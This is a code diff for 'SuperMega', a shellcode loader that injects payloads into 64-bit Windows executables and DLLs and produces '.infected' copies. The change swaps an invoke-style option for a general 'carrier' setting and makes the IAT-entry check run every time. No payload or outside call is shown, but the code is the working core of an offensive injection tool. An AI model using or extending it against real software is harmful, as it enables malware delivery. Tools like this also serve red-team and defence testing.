@@ -30,7 +30,7 @@ def main():
     parser = argparse.ArgumentParser(description='SuperMega shellcode loader')
     parser.add_argument('--shellcode', type=str, help='The path to the file of your payload shellcode')
     parser.add_argument('--inject', type=str, help='The path to the file where we will inject ourselves in')
-    parser.add_argument('--function_invoke_style', type=str, help='peb_walk or iat_reuse')
+    parser.add_argument('--carrier', type=str, help='carrier name (peb_walk, iat_reuse, ...)')
     parser.add_argument('--decoder', type=str, help='Template: which decoder plugin')
     parser.add_argument('--carrier_invoke', type=str, help='Redbackdoorer run argument (1 EAP, 2 hijack)')
     parser.add_argument('--start-injected', action='store_true', help='Dev: Start the generated infected executable at the end')
@@ -52,11 +52,8 @@ def main():
     if args.short_call_patching:
         settings.short_call_patching = True
 
-    if args.function_invoke_style:
-        if args.function_invoke_style == "peb_walk":
-            settings.source_style = FunctionInvokeStyle.peb_walk
-        elif args.function_invoke_style == "iat_reuse":
-            settings.source_style = FunctionInvokeStyle.iat_reuse
+    if args.carrier:
+        settings.carrier_name = args.carrier
     if args.decoder:
         if args.decoder == "plain_1":
             settings.decoder_style = DecoderStyle.PLAIN_1
@@ -89,7 +86,7 @@ def main():
         settings.inject_exe_in = args.inject
         settings.inject_exe_out = args.inject.replace(".exe", ".infected.exe").replace(".dll", ".infected.dll")
 
-    settings.prep_web("default")
+    settings.prep_web()
     write_webproject("default", settings)
     exit_code = start(settings)
     exit(exit_code)
@@ -107,7 +104,7 @@ def start(settings: Settings) -> int:
     observer.reset()
 
     # Prepare the project: copy all files to projects/<project_name>/
-    prepare_project("default", settings)
+    prepare_project(settings.project_name, settings)
 
     # Do the thing and catch the errors
     if False:
@@ -142,7 +139,7 @@ def start_real(settings: Settings):
         raise Exception("Binary is not 64bit: {}".format(project.settings.inject_exe_in))
 
     logger.info("--[ Config:  {}  {}  {}  {}".format(
-        project.settings.source_style.value, 
+        project.settings.carrier_name, 
         settings.payload_location.value,
         project.settings.decoder_style.value,
         project.settings.carrier_invoke_style.value))
@@ -170,13 +167,12 @@ def start_real(settings: Settings):
         
     # we have the carrier-required IAT entries in carrier.iat_requests
     # CHECK if all are available in infectable, or abort (early check)
-    if settings.source_style == FunctionInvokeStyle.iat_reuse:
-        functions = project.carrier.get_unresolved_iat()
-        if len(functions) != 0:
-            if settings.fix_missing_iat:
-                logger.info("--[ Fixing missing IAT entries: {}".format(", ".join(functions)))
-            else:
-                raise Exception("IAT entry not found: {}".format(", ".join(functions)))
+    functions = project.carrier.get_unresolved_iat()
+    if len(functions) != 0:
+        if settings.fix_missing_iat:
+            logger.info("--[ Fixing missing IAT entries: {}".format(", ".join(functions)))
+        else:
+            raise Exception("IAT entry not found: {}".format(", ".join(functions)))
 
     # ASSEMBLE: Assemble .asm to .shc (ASM -> SHC)
     if settings.generate_shc_from_asm:
